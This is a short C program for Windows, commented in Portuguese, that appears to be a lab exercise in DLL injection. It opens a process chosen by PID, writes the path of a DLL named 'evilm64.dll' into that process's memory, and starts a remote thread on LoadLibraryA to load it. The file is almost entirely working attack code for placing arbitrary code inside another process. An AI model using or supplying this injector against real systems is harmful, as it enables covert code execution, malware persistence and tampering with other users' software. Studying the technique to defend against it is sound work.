#include <windows.h>
#include <tlhelp32.h>
#include <stdarg.h>
#include <stdio.h>

//tecnica de dll injection
void dllInject(int pid){
	HANDLE processHandle;
	PVOID remoteBuffer;
	const char dllPath[] = "C:\\experiments\\evilm64.dll"; //local da sua dll
	
	printf("Injecting DLL to PID: %i\n", pid);
	processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, (DWORD)pid);
	remoteBuffer = VirtualAllocEx(processHandle, NULL, sizeof dllPath, MEM_COMMIT, PAGE_READWRITE);	
	WriteProcessMemory(processHandle, remoteBuffer, (LPVOID)dllPath, sizeof dllPath, NULL);
	PTHREAD_START_ROUTINE threatStartRoutineAddress = (PTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandleA("Kernel32"), "LoadLibraryA");
	CreateRemoteThread(processHandle, NULL, 0, threatStartRoutineAddress, remoteBuffer, 0, NULL);
	CloseHandle(processHandle); 
}
int main(int argc, char *argv[]){
    //passe como argumento no argv[1] um n√∫mero inteiro representando um PID de um processo para injetar a dll
    dllInject(atoi(argv[1]));
}